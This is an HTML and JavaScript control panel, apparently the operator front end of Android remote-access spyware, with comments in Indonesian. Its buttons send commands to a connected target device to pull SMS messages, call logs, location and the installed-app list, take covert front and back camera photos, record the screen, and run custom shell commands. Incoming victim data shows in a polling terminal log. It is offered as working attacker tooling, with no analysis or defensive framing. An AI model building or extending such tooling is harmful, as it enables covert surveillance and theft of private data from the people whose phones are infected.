<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>C2 Control Panel</title>
    <style>
        body { background-color: #0a0a0a; color: #00ff00; font-family: 'Courier New', Courier, monospace; margin: 0; padding: 20px; }
        .container { max-width: 900px; margin: 0 auto; }
        .header { border-bottom: 1px solid #00ff00; padding-bottom: 10px; margin-bottom: 20px; display: flex; justify-content: space-between; }
        .status-box { font-weight: bold; }
        .offline { color: red; } .online { color: lime; }
        .grid { display: grid; grid-template-columns: repeat(auto-fit, minmax(150px, 1fr)); gap: 10px; margin-bottom: 20px; }
        button { background-color: #111; color: #00ff00; border: 1px solid #00ff00; padding: 10px; cursor: pointer; text-transform: uppercase; font-weight: bold; transition: 0.2s; }
        button:hover { background-color: #00ff00; color: #000; }
        .terminal { background-color: #000; border: 1px solid #333; height: 300px; overflow-y: scroll; padding: 10px; font-size: 14px; }
        .custom-cmd { display: flex; gap: 10px; margin-top: 10px; }
        input[type="text"] { flex: 1; background: #111; border: 1px solid #00ff00; color: #00ff00; padding: 10px; outline: none; }
    </style>
</head>
<body>
    <div class="container">
        <div class="header">
            <h2>> REMOTE C2 AGENT</h2>
            <div class="status-box">Status: <span id="conn-status" class="offline">DISCONNECTED</span></div>
        </div>

        <div class="grid">
            <button onclick="sendCmd('deviceinfo')">Device Info</button>
            <button onclick="sendCmd('list_app')">List Apps</button>
            <button onclick="sendCmd('getsms')">Get SMS</button>
            <button onclick="sendCmd('getcalllogs')">Call Logs</button>
            <button onclick="sendCmd('get_location')">Location</button>
            <button onclick="sendCmd('takefrontpic')">Front Cam</button>
            <button onclick="sendCmd('takebackpic')">Back Cam</button>
            <button onclick="sendCmd('flashon')">Flash On</button>
            <button onclick="sendCmd('flashoff')">Flash Off</button>
            <button onclick="sendCmd('screen_recorder')">Record Screen</button>
        </div>

        <div class="custom-cmd">
            <input type="text" id="cmdInput" placeholder="Enter custom command (e.g., shell, open <url>, toast <text>)...">
            <button onclick="sendCustom()">Execute</button>
        </div>

        <h3 style="margin-top: 30px;">> TERMINAL LOGS</h3>
        <div class="terminal" id="terminal"></div>
    </div>

    <script>
        const terminal = document.getElementById('terminal');
        const statusSpan = document.getElementById('conn-status');
        const cmdInput = document.getElementById('cmdInput');

        // Fungsi kirim perintah dari button
        function sendCmd(cmd) {
            fetch('/api/command', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ cmd: cmd })
            }).then(res => res.json())
              .then(data => { if(data.status === 'error') alert("Error: " + data.message); })
              .catch(err => console.error(err));
        }

        // Fungsi kirim perintah dari input box
        function sendCustom() {
            if(cmdInput.value.trim() !== "") {
                sendCmd(cmdInput.value);
                cmdInput.value = "";
            }
        }
        
        // Eksekusi custom cmd kalau pencet Enter
        cmdInput.addEventListener("keypress", function(event) {
            if (event.key === "Enter") { event.preventDefault(); sendCustom(); }
        });

        // Polling buat narik data & log dari server tiap 1.5 detik
        setInterval(() => {
            fetch('/api/status')
                .then(res => res.json())
                .then(data => {
                    // Update Status Target
                    if(data.connected) {
                        statusSpan.textContent = `ONLINE (${data.address[0]})`;
                        statusSpan.className = 'online';
                    } else {
                        statusSpan.textContent = 'DISCONNECTED';
                        statusSpan.className = 'offline';
                    }

                    // Update Terminal view
                    let logHtml = "";
                    data.logs.forEach(log => { logHtml += `<div>${log}</div>`; });
                    
                    // Auto scroll ke bawah kalau ada log baru
                    let isScrolledToBottom = terminal.scrollHeight - terminal.clientHeight <= terminal.scrollTop + 1;
                    terminal.innerHTML = logHtml;
                    if(isScrolledToBottom) { terminal.scrollTop = terminal.scrollHeight; }
                })
                .catch(err => console.error(err));
        }, 1500);
    </script>
</body>
</html>
